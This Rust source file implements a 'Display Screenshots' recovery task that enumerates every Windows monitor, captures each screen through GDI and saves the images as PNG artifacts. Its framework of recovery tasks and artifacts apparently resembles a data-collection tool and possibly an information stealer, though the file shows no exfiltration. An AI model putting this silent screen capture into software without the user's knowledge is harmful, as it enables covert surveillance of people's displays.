use crate::recovery::{
    context::RecoveryContext,
    output::write_binary_artifact,
    settings::RecoveryControl,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::sync::Arc;
use tokio::task;
#[cfg(windows)]
use tracing::info;
use tracing::warn;

pub fn screenshot_task(_ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(ScreenshotTask)
}

struct ScreenshotTask;

#[async_trait]
impl RecoveryTask for ScreenshotTask {
    fn label(&self) -> String {
        "Display Screenshots".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        if !RecoveryControl::global().capture_screenshots() {
            return Ok(Vec::new());
        }

        let captures = task::spawn_blocking(capture_all_screens)
            .await
            .map_err(|err| {
                RecoveryError::Custom(format!("screenshot capture interrupted: {err}"))
            })?;

        let mut artifacts = Vec::new();
        for capture in captures {
            let file_name = format!("monitor-{}.png", capture.index);
            let artifact = write_binary_artifact(
                ctx,
                self.category(),
                &self.label(),
                &file_name,
                &capture.png_bytes,
            )
            .await?;
            artifacts.push(artifact);
        }

        Ok(artifacts)
    }
}

pub struct MonitorCapture {
    pub index: usize,
    pub png_bytes: Vec<u8>,
}

#[cfg(windows)]
#[derive(Clone)]
struct MonitorInfo {
    rect: windows::Win32::Foundation::RECT,
    device_name: String,
}

#[cfg(windows)]
pub fn capture_all_screens() -> Vec<MonitorCapture> {
    use std::mem::{size_of, zeroed};
    use windows::Win32::Foundation::{BOOL, LPARAM, RECT};
    use windows::Win32::Graphics::Gdi::{
        EnumDisplayMonitors, GetMonitorInfoW, HDC, MONITORINFOEXW,
    };

    unsafe extern "system" fn enum_monitor(
        monitor: windows::Win32::Graphics::Gdi::HMONITOR,
        _hdc: HDC,
        _rect: *mut RECT,
        lparam: LPARAM,
    ) -> BOOL {
        let monitors = unsafe { &mut *(lparam.0 as *mut Vec<MonitorInfo>) };
        let mut info: MONITORINFOEXW = unsafe { zeroed() };
        info.monitorInfo.cbSize = size_of::<MONITORINFOEXW>() as u32;
        if unsafe { GetMonitorInfoW(monitor, &mut info as *mut _ as *mut _) }.as_bool() {
            let name = utf16_to_string(&info.szDevice);
            monitors.push(MonitorInfo {
                rect: info.monitorInfo.rcMonitor,
                device_name: name,
            });
        }
        BOOL(1)
    }

    let mut monitors: Vec<MonitorInfo> = Vec::new();
    unsafe {
        EnumDisplayMonitors(
            HDC(0),
            None,
            Some(enum_monitor),
            LPARAM(&mut monitors as *mut _ as isize),
        );
    }

    if monitors.is_empty() {
        warn!("no monitors detected for screenshots");
        return Vec::new();
    }

    let mut captures = Vec::new();
    for (idx, monitor) in monitors.into_iter().enumerate() {
        match capture_monitor(idx + 1, &monitor) {
            Ok(capture) => {
                info!(
                    monitor = %monitor.device_name,
                    index = capture.index,
                    "captured screenshot"
                );
                captures.push(capture);
            }
            Err(err) => {
                warn!(
                    monitor = %monitor.device_name,
                    error = %err,
                    "failed to capture monitor screenshot"
                );
            }
        }
    }

    captures
}

#[cfg(not(windows))]
fn capture_all_screens() -> Vec<MonitorCapture> {
    warn!("screenshot capture is not supported on this platform");
    Vec::new()
}

#[cfg(windows)]
fn capture_monitor(index: usize, monitor: &MonitorInfo) -> Result<MonitorCapture, String> {
    use std::mem::size_of;
    use windows::Win32::Foundation::{HWND, RECT};
    use windows::Win32::Graphics::Gdi::{
        BI_RGB, BITMAPINFO, BITMAPINFOHEADER, CAPTUREBLT, CreateCompatibleBitmap,
        CreateCompatibleDC, DIB_RGB_COLORS, DeleteDC, DeleteObject, GetDC, GetDIBits, HGDIOBJ,
        RGBQUAD, ReleaseDC, SRCCOPY, SelectObject,
    };

    let RECT {
        left,
        top,
        right,
        bottom,
    } = monitor.rect;
    let width = right - left;
    let height = bottom - top;
    if width <= 0 || height <= 0 {
        return Err("invalid monitor bounds".to_string());
    }

    unsafe {
        let screen_dc = GetDC(HWND(0));
        if screen_dc.0 == 0 {
            return Err("failed to acquire screen dc".to_string());
        }
        let mem_dc = CreateCompatibleDC(screen_dc);
        if mem_dc.0 == 0 {
            ReleaseDC(HWND(0), screen_dc);
            return Err("failed to create compatible dc".to_string());
        }
        let bitmap = CreateCompatibleBitmap(screen_dc, width, height);
        if bitmap.0 == 0 {
            DeleteDC(mem_dc);
            ReleaseDC(HWND(0), screen_dc);
            return Err("failed to create compatible bitmap".to_string());
        }

        let old = SelectObject(mem_dc, HGDIOBJ(bitmap.0));
        let blt_ok = windows::Win32::Graphics::Gdi::BitBlt(
            mem_dc,
            0,
            0,
            width,
            height,
            screen_dc,
            left,
            top,
            SRCCOPY | CAPTUREBLT,
        );
        if let Err(err) = blt_ok {
            SelectObject(mem_dc, old);
            DeleteObject(HGDIOBJ(bitmap.0));
            DeleteDC(mem_dc);
            ReleaseDC(HWND(0), screen_dc);
            return Err(format!("BitBlt failed: {err}"));
        }

        let mut bmi = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize: size_of::<BITMAPINFOHEADER>() as u32,
                biWidth: width,
                biHeight: -height,
                biPlanes: 1,
                biBitCount: 32,
                biCompression: BI_RGB.0,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [RGBQUAD::default(); 1],
        };

        let buffer_len = (width * height * 4) as usize;
        let mut bgra = vec![0u8; buffer_len];
        let scanlines = GetDIBits(
            mem_dc,
            bitmap,
            0,
            height as u32,
            Some(bgra.as_mut_ptr() as *mut _),
            &mut bmi,
            DIB_RGB_COLORS,
        );

        SelectObject(mem_dc, old);
        DeleteObject(HGDIOBJ(bitmap.0));
        DeleteDC(mem_dc);
        ReleaseDC(HWND(0), screen_dc);

        if scanlines == 0 {
            return Err("GetDIBits failed".to_string());
        }

        let rgba = bgra_to_rgba(&bgra);
        let png_bytes = encode_png(width as u32, height as u32, &rgba)?;

        Ok(MonitorCapture { index, png_bytes })
    }
}

#[cfg(windows)]
fn bgra_to_rgba(bgra: &[u8]) -> Vec<u8> {
    let mut rgba = Vec::with_capacity(bgra.len());
    for chunk in bgra.chunks_exact(4) {
        rgba.push(chunk[2]);
        rgba.push(chunk[1]);
        rgba.push(chunk[0]);
        rgba.push(chunk[3]);
    }
    rgba
}

#[cfg(windows)]
fn encode_png(width: u32, height: u32, rgba: &[u8]) -> Result<Vec<u8>, String> {
    use image::codecs::png::PngEncoder;
    use image::{ColorType, ImageEncoder};
    let mut bytes = Vec::new();
    let encoder = PngEncoder::new(&mut bytes);
    encoder
        .write_image(rgba, width, height, ColorType::Rgba8.into())
        .map_err(|err| format!("png encode failed: {err}"))?;
    Ok(bytes)
}

#[cfg(windows)]
fn utf16_to_string(input: &[u16]) -> String {
    let len = input.iter().position(|&c| c == 0).unwrap_or(input.len());
    String::from_utf16_lossy(&input[..len])
}
